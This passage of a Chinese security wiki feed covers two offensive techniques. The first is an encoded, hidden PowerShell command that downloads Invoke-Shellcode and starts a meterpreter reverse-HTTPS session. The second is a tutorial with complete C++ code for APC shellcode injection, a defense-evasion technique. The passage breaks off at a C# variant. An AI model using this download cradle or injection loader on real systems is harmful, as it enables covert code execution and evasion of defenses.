class="line">python ps_encoder.py -s ./raw.txt</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/7.png"></p><p>经过base64编码的PowerShell命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAIgApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAMgA3AC4AMAAuADAALgAxACAALQBMAHAAbwByAHQAIAA4ADAAIAAKAA==</span><br></pre></td></tr></table></figure><p>在远程主机上执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -w hidden -exec bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAIgApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAMgA3AC4AMAAuADAALgAxACAALQBMAHAAbwByAHQAIAA4ADAAIAAKAA==</span><br></pre></td></tr></table></figure><p><img src="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/8.png"></p><p>运行32位和64位PowerShell</p><p>在64位的Windows操作系统上，存在两个版本的PowerShell，一个是x64，一个x86，两个版本的执行策略不会互相影响。x64版本在PowerShell的配置文件在%widir%\syswow64\WindowsPowerShell\v1.0\ 目录下。</p><p>运行32位PowerShell脚本，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell.exe -NoP -NonI -w hidden -exec bypass</span><br></pre></td></tr></table></figure><p>运行64位PowerShell脚本，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%widir%\syswow64\WindowsPowerShell\v1.0\PowerShell.exe -NoP -NonI -w hidden -exec bypass</span><br></pre></td></tr></table></figure><p>一个PowerShell在线教程</p><p><a href="https://www.pstips.net/powershell-online-tutorials">https://www.pstips.net/powershell-online-tutorials</a></p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><blockquote><ul><li><a href="https://www.pstips.net/powershell-online-tutorials">https://www.pstips.net/powershell-online-tutorials</a></li><li><a href="https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1">https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Metadata&quot;&gt;&lt;a href=&quot;#Metadata&quot; class=&quot;headerlink&quot; title=&quot;Metadata&quot;&gt;&lt;/a&gt;Metadata&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;th&gt;Tahir&lt;/t</summary>
      
    
    
    
    <category term="4. 内网安全攻防" scheme="http://example.com/categories/4-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/"/>
    
    <category term="0-内网攻防基础" scheme="http://example.com/categories/4-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="0-内网攻防基础" scheme="http://example.com/tags/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/"/>
    <id>http://example.com/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/</id>
    <published>2021-08-02T03:14:34.000Z</published>
    <updated>2021-09-13T08:26:03.472Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Metadata"><a href="#Metadata" class="headerlink" title="Metadata"></a>Metadata</h2><table><thead><tr><th>Author</th><th>Tahir</th></tr></thead><tbody><tr><td>Creation Date</td><td>2021/08/02</td></tr><tr><td>Modification Date</td><td>2021/08/02</td></tr><tr><td>Tactics</td><td><a href="https://attack.mitre.org/tactics/TA0005/">TA0005</a></td></tr><tr><td>Techniques</td><td><a href="https://attack.mitre.org/techniques/T1055/003/">T1055.003</a></td></tr></tbody></table><h2 id="Tactics"><a href="#Tactics" class="headerlink" title="Tactics"></a>Tactics</h2><p>Defense Evasion</p><h2 id="Techniques"><a href="#Techniques" class="headerlink" title="Techniques"></a>Techniques</h2><h3 id="Shellcode-APC注入和加载"><a href="#Shellcode-APC注入和加载" class="headerlink" title="Shellcode APC注入和加载"></a>Shellcode APC注入和加载</h3><p>一般的shellcode加载器，流程为调用virtualAlloc分配空间、复制shellcode、执行shellcode，所有操作都在加载器的内存空间，隐蔽性不强，容易被发现。如果利用其他进程的内存空间，进行shellcode注入和加载执行，可以进行防御规避。</p><p>Shellcode远程线程注入，一般是利用CreateRemoteThread<code>，</code>SuspendThread<code>/ </code>SetThreadContext<code>/ </code>ResumeThread，和那些可用于另一过程中修改存储器，诸如VirtualAllocEx/ WriteProcessMemory：在目标进程创建一个线程，把shellcode复制到目标进程后执行。但是这些API，已经能被各大厂商进行检测拦截，所以，介绍另一种远程Shellcode注入的方式——APC注入。</p><h4 id="APC（异步过程调用）"><a href="#APC（异步过程调用）" class="headerlink" title="APC（异步过程调用）"></a>APC（异步过程调用）</h4><p><strong>APC（异步过程调用）：</strong></p><p>线程在执行的时候如果自身不主动跳转去其他地方，就会一直占有CPU。所以通过APC机制，在线程执行的期间，定时检查是否存在其他需要执行的代码。</p><p>Windows APC函数是被按照先进先出（FIFO）顺序放置在一个队列Queue上面的。同时，用户APC函数极为特别，它只有在线程处于“alertable的线程等待状态”时才能被线程调用。但是，线程一旦开始调用APC函数，就会一次性将所有APC队列上的函数全部执行完毕。通过这种方式可以让ring3的死循环线程不会一直占用CPU，使得别的线程可以执行。</p><p>alertable状态代表线程暂时无重要的事情要做。APC函数不会去干预（中断）线程的运行。一个线程，有两个APC队列，分别为用户APC和系统APC。用户模式下，可以调用函数SleepEx、SignalObjectAndWait、WaitForSingleObjectEx、WaitForMultipleObjectsEx、MsgWaitForMultipleObjectsEx都可以使目标线程处于alertable等待状态，从而<strong>让用户模式APCs执行</strong>。</p><p><strong>APC（异步过程调用）作用：</strong></p><p>1、APCs允许用户程序和系统元件在一个进程的地址空间内某个线程的上下文中执行代码。</p><p>2、I/O管理器使用APCs来完成一个线程发起的异步的I/O操作。例如：当一个设备驱动调用IoCompleteRequest来通知I/O管理器，它已经结束处理一个异步I/O请求时，I/O管理器排队一个APC到发起请求的线程。然后线程在一个较低IRQL级别，来执行APC。 APC的作用是从系统空间拷贝I/O操作结果和状态信息到线程虚拟内存空间的一个缓冲中。</p><p>3、使用APC可以得到或者设置一个线程的上下文和挂起线程的执行。</p><h2 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h2><h4 id="APC注入一般步骤"><a href="#APC注入一般步骤" class="headerlink" title="APC注入一般步骤"></a>APC注入一般步骤</h4><p><img src="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/1.png"></p><p>APC注入步骤简单概述，以explorer.exe进程的APC注入为例：</p><ul><li>编写一个 IinjectQueuerAPC.exe</li><li>查找 explorer.exe 进程 ID</li><li>在 explorer.exe 进程内存空间分配内存</li><li>将 shellcode 写入该内存位置</li><li>查找 explorer.exe 中的所有thread</li><li>在 explorer.exe 中查找所有线程，将 APC 队列到所有这些线程</li><li>将APC指向shellcode</li><li>当 explorer.exe 中的线程被调度时，我们的 shellcode 就会被执行</li></ul><h4 id="APC注入（C-）"><a href="#APC注入（C-）" class="headerlink" title="APC注入（C++）"></a>APC注入（C++）</h4><p>通常 explorer.exe有很多线程活动，所以有机会遇到一个处于alertable的线程，为了更好的演示，写一个处于alterable状态的sleepex.exe，将shellcode注入sleepex.exe的APC队列里。</p><p>sleepex.exe</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;enter alertable statues...............&quot;</span>);</span><br><span class="line">    <span class="built_in">SleepEx</span>(<span class="number">1000</span>*<span class="number">600</span>,TRUE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 通过 Process32First 和 Process32Next 调用，根据进程名，找到目标进程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;processEntry)) &#123;</span><br><span class="line">    <span class="keyword">while</span> (_wcsicmp(processEntry.szExeFile, <span class="string">L&quot;sleepex.exe&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">Process32Next</span>(snapshot, &amp;processEntry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后打开进程、分配空间、写入shellcode；</p><p>找到 explorer 进程的PID，需要获取 sleepex.exe 进程的句柄并为 shellcode 分配一些内存。 将 shellcode 写入sleepex 的进程内存。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*在目标进程中申请一个空间</span></span><br><span class="line"><span class="comment">    获取目标进程句柄</span></span><br><span class="line"><span class="comment">    参数1：想要拥有的进程权限（本例为所有能获得的权限）</span></span><br><span class="line"><span class="comment">    参数2：表示所得到的进程句柄是否可以被继承</span></span><br><span class="line"><span class="comment">    参数3：被打开进程的PID</span></span><br><span class="line"><span class="comment">    返回值:指定进程的句柄</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">victimProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, processEntry.th32ProcessID);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在目标进程的内存里开辟空间</span></span><br><span class="line"><span class="comment">    参数1：目标进程句柄</span></span><br><span class="line"><span class="comment">    参数2：保留页面的内存地址，一般用NULL自动分配</span></span><br><span class="line"><span class="comment">    参数3：欲分配的内存大小，字节单位</span></span><br><span class="line"><span class="comment">    参数4：MEM_COMMIT：为特定的页面区域分配内存中或磁盘的页面文件中的物理存储</span></span><br><span class="line"><span class="comment">    参数5：PAGE_EXECUTE_READWRITE 区域可被应用程序读写执行</span></span><br><span class="line"><span class="comment">    返回值：执行成功就返回分配内存的首地址，不成功就是NULL</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">LPVOID shellAddress = <span class="built_in">VirtualAllocEx</span>(victimProcess, <span class="literal">NULL</span>, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//把shellcode写入到目标进程的内存空间中</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    写shellcode到刚才给指定进程所开辟的内存空间里</span></span><br><span class="line"><span class="comment">    参数1：OpenProcess返回的进程句柄</span></span><br><span class="line"><span class="comment">    参数2：准备写入的内存首地址</span></span><br><span class="line"><span class="comment">    参数3：指向要写的数据的指针（准备写入的东西）</span></span><br><span class="line"><span class="comment">    参数4：要写入的字节数（东西的长度+0/）</span></span><br><span class="line"><span class="comment">    参数5： 返回值。返回实际写入的字节</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(victimProcess, shellAddress, buf, shellSize, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>遍历 sleepex.exe 的所有线程，并调用QueueUserAPC，将shellcode注入目标线程。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(snapshot, &amp;threadEntry)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) &#123;</span><br><span class="line">                threadIds.<span class="built_in">push_back</span>(threadEntry.th32ThreadID);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(snapshot, &amp;threadEntry));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (DWORD threadId : threadIds) &#123;</span><br><span class="line">        threadHandle = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, TRUE, threadId);</span><br><span class="line">        <span class="built_in">QueueUserAPC</span>((PAPCFUNC)apcRoutine, threadHandle, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span> * <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>完整InjectAPC.cpp代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">wchar_t</span> *<span class="title">GetWC</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> cSize = <span class="built_in">strlen</span>(c)+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">wchar_t</span>* wc = <span class="keyword">new</span> <span class="keyword">wchar_t</span>[cSize];</span><br><span class="line">    <span class="built_in">mbstowcs</span> (wc, c, cSize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> wc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\xE9\x8B\x01\x00\x00\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x64\xA1\x30\x00\x00\x00\x85\xC0\x78\x0D\x8B\x40\x0C\x8B\x40\x14\x8B\x00\x8B\x00\x8B\x40\x10\xC3\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC\x55\x8B\xEC\x83\xEC\x40\x53\x56\x8B\xD9\x57\x89\x5D\xF4\xE8\xCD\xFF\xFF\xFF\x8B\xF0\x33\xFF\x8B\x56\x3C\x39\x7C\x32\x7C\x75\x07\x33\xFF\xE9\x9C\x00\x00\x00\x8B\x44\x32\x78\x85\xC0\x74\xF1\x8B\x54\x30\x18\x85\xD2\x74\xE9\x8B\x4C\x30\x24\x8B\x5C\x30\x20\x03\xCE\x8B\x44\x30\x1C\x03\xDE\x03\xC6\x89\x4D\xFC\x33\xC9\x89\x45\xF8\x4A\x8B\x04\x8B\x03\xC6\x80\x38\x47\x75\x4E\x80\x78\x01\x65\x75\x48\x80\x78\x02\x74\x75\x42\x80\x78\x03\x50\x75\x3C\x80\x78\x04\x72\x75\x36\x80\x78\x05\x6F\x75\x30\x80\x78\x06\x63\x75\x2A\x80\x78\x07\x41\x75\x24\x80\x78\x08\x64\x75\x1E\x80\x78\x09\x64\x75\x18\x80\x78\x0A\x72\x75\x12\x80\x78\x0B\x65\x75\x0C\x80\x78\x0C\x73\x75\x06\x80\x78\x0D\x73\x74\x07\x41\x3B\xCA\x76\xA3\xEB\x0F\x8B\x45\xFC\x8B\x7D\xF8\x0F\xB7\x04\x48\x8B\x3C\x87\x03\xFE\x8B\x5D\xF4\x8D\x45\xC0\x89\x3B\x50\xC7\x45\xC0\x4C\x6F\x61\x64\xC7\x45\xC4\x4C\x69\x62\x72\xC7\x45\xC8\x61\x72\x79\x41\xC6\x45\xCC\x00\xE8\xF9\xFE\xFF\xFF\x50\x8B\x03\xFF\xD0\x8D\x4D\xDC\x89\x43\x04\x51\x8D\x4D\xE8\xC7\x45\xE8\x55\x73\x65\x72\x51\xC7\x45\xEC\x33\x32\x2E\x64\x66\xC7\x45\xF0\x6C\x6C\xC6\x45\xF2\x00\xC7\x45\xDC\x4D\x65\x73\x73\xC7\x45\xE0\x61\x67\x65\x42\xC7\x45\xE4\x6F\x78\x41\x00\xFF\xD0\x50\x8B\x03\xFF\xD0\x89\x43\x08\x8D\x45\xD0\x50\xC7\x45\xD0\x43\x72\x65\x61\xC7\x45\xD4\x74\x65\x46\x69\xC7\x45\xD8\x6C\x65\x41\x00\xE8\x94\xFE\xFF\xFF\x50\x8B\x03\xFF\xD0\x5F\x5E\x89\x43\x0C\x5B\x8B\xE5\x5D\xC3\xCC\xCC\xCC\xCC\xCC\x55\x8B\xEC\x83\xEC\x24\x8D\x4D\xDC\xE8\x92\xFE\xFF\xFF\x6A\x00\x8D\x45\xFC\xC7\x45\xEC\x48\x65\x6C\x6C\x50\x8D\x45\xEC\x66\xC7\x45\xF0\x6F\x21\x50\x6A\x00\xC6\x45\xF2\x00\xC7\x45\xFC\x54\x69\x70\x00\xFF\x55\xE4\x6A\x00\x6A\x00\x6A\x02\x6A\x00\x6A\x00\x68\x00\x00\x00\x40\x8D\x45\xF4\xC7\x45\xF4\x31\x2E\x74\x78\x50\x66\xC7\x45\xF8\x74\x00\xFF\x55\xE8\x8B\xE5\x5D\xC3\xCC\xCC\xCC\xCC&quot;</span>;</span><br><span class="line">HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line">HANDLE victimProcess = <span class="literal">NULL</span>;</span><br><span class="line">PROCESSENTRY32 processEntry = &#123; <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32) &#125;;</span><br><span class="line">THREADENTRY32 threadEntry = &#123; <span class="built_in"><span class="keyword">sizeof</span></span>(THREADENTRY32) &#125;;</span><br><span class="line">std::vector&lt;DWORD&gt; threadIds;</span><br><span class="line">SIZE_T shellSize = <span class="built_in"><span class="keyword">sizeof</span></span>(shellcode);</span><br><span class="line">HANDLE threadHandle = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;processEntry)) &#123;</span><br><span class="line"><span class="keyword">while</span> (_wcsicmp(<span class="built_in">GetWC</span>(processEntry.szExeFile), <span class="string">L&quot;sleepex.exe&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">Process32Next</span>(snapshot, &amp;processEntry);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;processEntry.szExeFile is: %ls \n&quot;</span>, <span class="built_in">GetWC</span>(processEntry.szExeFile));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">victimProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, processEntry.th32ProcessID);</span><br><span class="line">LPVOID shellAddress = <span class="built_in">VirtualAllocEx</span>(victimProcess, <span class="literal">NULL</span>, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(victimProcess, shellAddress, shellcode, shellSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;shellAddress is: %p\n&quot;</span>, shellAddress);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Thread32First</span>(snapshot, &amp;threadEntry)) &#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (threadEntry.th32OwnerProcessID == processEntry.th32ProcessID) &#123;</span><br><span class="line">threadIds.<span class="built_in">push_back</span>(threadEntry.th32ThreadID);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Thread32Next</span>(snapshot, &amp;threadEntry));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (DWORD threadId : threadIds) &#123;</span><br><span class="line">threadHandle = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, TRUE, threadId);</span><br><span class="line"><span class="built_in">QueueUserAPC</span>((PAPCFUNC)apcRoutine, threadHandle, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;apcRoutine is: %p------&gt;threadId:%d\n&quot;</span>, apcRoutine, threadId);</span><br><span class="line"><span class="built_in">Sleep</span>(<span class="number">1000</span> * <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行后，shellcode被执行弹出对话框</p><p><img src="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/3.png"></p><h4 id="APC注入（C-）-1"><a href="#APC注入（C-）-1" class="headerlink" title="APC注入（C#）"></a>APC注入（C#）</h4><p>下面使用c#编写APC注入，C#思路是直接起一个新的notepad.exe进程，并设置alterable状态，然后直接进行APC注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 